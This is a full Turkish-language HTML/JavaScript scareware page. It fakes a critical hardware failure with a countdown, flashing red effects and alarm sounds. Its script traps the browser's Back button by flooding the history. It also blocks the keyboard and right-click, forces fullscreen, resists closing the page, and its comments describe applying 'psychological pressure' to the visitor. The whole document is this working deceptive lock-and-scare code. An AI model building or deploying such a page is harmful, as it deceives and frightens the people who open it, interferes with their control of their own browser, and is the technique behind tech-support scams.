<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SİSTEM İMHASI DURDURULAMAZ</title>
    <style>
        * { margin: 0; padding: 0; cursor: none !important; }
        body, html { 
            width: 100%; height: 100%; overflow: hidden; background: #000;
            font-family: 'Courier New', Courier, monospace;
            touch-action: none; -ms-touch-action: none;
        }

        canvas { position: fixed; top: 0; left: 0; z-index: 1; }

        #panic-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100; display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            background: rgba(0,0,0,0.9); color: #ff0000; text-align: center;
        }

        .warning-frame {
            border: 10px double #ff0000; padding: 50px;
            background: #050000; box-shadow: 0 0 100px #f00;
            animation: glitch-border 0.1s infinite;
        }

        #timer { font-size: 15vw; font-weight: bold; text-shadow: 0 0 50px #f00; }
        
        .status { font-size: 1.5rem; margin-top: 20px; text-transform: uppercase; }

        @keyframes glitch-border {
            0% { border-color: #ff0000; }
            50% { border-color: #fff; transform: scale(1.01); }
            100% { border-color: #ff0000; }
        }

        /* Sahte sistem hata pencereleri */
        .fake-popup {
            position: absolute; width: 300px; height: 150px;
            background: #eee; border: 2px solid #000; color: #000;
            z-index: 200; display: none; padding: 10px; font-family: sans-serif;
            box-shadow: 10px 10px 0 rgba(0,0,0,0.5);
        }
    </style>
</head>
<body onbeforeunload="return false;">

<canvas id="canvas"></canvas>

<div id="panic-layer">
    <div class="warning-frame">
        <h1 style="font-size: 3rem;">⚠️ KRİTİK DONANIM HATASI ⚠️</h1>
        <p class="status">İŞLEMCİ ÇEKİRDEKLERİ AŞIRI ISINIYOR</p>
        <div id="timer">20</div>
        <p style="color: #fff; background: red; padding: 10px;">DİKKAT: HERHANGİ BİR TUŞA BASMAK VERİ KAYBINI HIZLANDIRIR</p>
    </div>
</div>

<script>
    // 1. SONSUZ GEÇMİŞ DÖNGÜSÜ (Geri tuşunu tamamen bozar)
    (function() {
        for(let i=0; i<100; i++) {
            history.pushState({page: i}, "", "#illegal_access_" + i);
        }
        window.onpopstate = function(event) {
            history.forward();
            alert("SİSTEM KİLİTLİ: GERİ DÖNÜŞ ENGELLENDİ!");
        };
    })();

    // 2. KLAVYE VE MOUSE KİLİDİ (Mümkün olan her şeyi engelle)
    document.addEventListener('keydown', function(e) {
        e.preventDefault();
        e.stopPropagation();
        // Psikolojik baskı: Kullanıcı bir tuşa basarsa daha korkutucu bir ses çal
        playGlitchSound(800, 'square');
        return false;
    }, true);

    // 3. TAM EKRAN ZORLAMASI (Sürekli tetikle)
    function forceFull() {
        let el = document.documentElement;
        if (el.requestFullscreen) el.requestFullscreen();
        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
        else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
    }

    // 4. AGRESİF SES MOTORU (Kulak tırmalayıcı alarm)
    let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    function playAlarm() {
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(440, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.5);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.5);
    }
    
    function playGlitchSound(freq, type) {
        const osc = audioCtx.createOscillator();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
        osc.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.1);
    }

    // 5. MATRIX YAĞMURU (Maksimum Hız)
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const columns = canvas.width / 20;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#f00";
        ctx.font = "bold 18px monospace";
        drops.forEach((y, i) => {
            const text = "0101ERROR"[Math.floor(Math.random()*9)];
            ctx.fillText(text, i * 20, y * 20);
            if (y * 20 > canvas.height && Math.random() > 0.95) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 20);

    // 6. ANA DÖNGÜ (KİLİTLEME)
    document.addEventListener('click', function() {
        forceFull(); // Her tıkta tam ekran yap
        audioCtx.resume();
        setInterval(playAlarm, 600);
    }, {once: true});

    let timeLeft = 20;
    const timerEl = document.getElementById('timer');
    const countdown = setInterval(() => {
        timeLeft--;
        timerEl.innerText = timeLeft;

        // Ekranı rastgele salla ve renkleri ters çevir
        if(timeLeft < 15) {
            document.body.style.filter = Math.random() > 0.8 ? "invert(1)" : "none";
        }

        if (timeLeft <= 0) {
            clearInterval(countdown);
            document.body.innerHTML = `
                <div style="background:white; color:black; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column;">
                    <h1 style="font-size:5rem;">DONE.</h1>
                    <p>Sistem başarıyla stabilize edildi.</p>
                    <button onclick="location.reload()" style="padding:20px; margin-top:20px;">YENİDEN BAŞLAT</button>
                </div>
            `;
            document.body.style.filter = "none";
        }
    }, 1000);

    // Sağ tık ve diğer her şeyi engelle
    window.oncontextmenu = () => false;
</script>

</body>
</html>
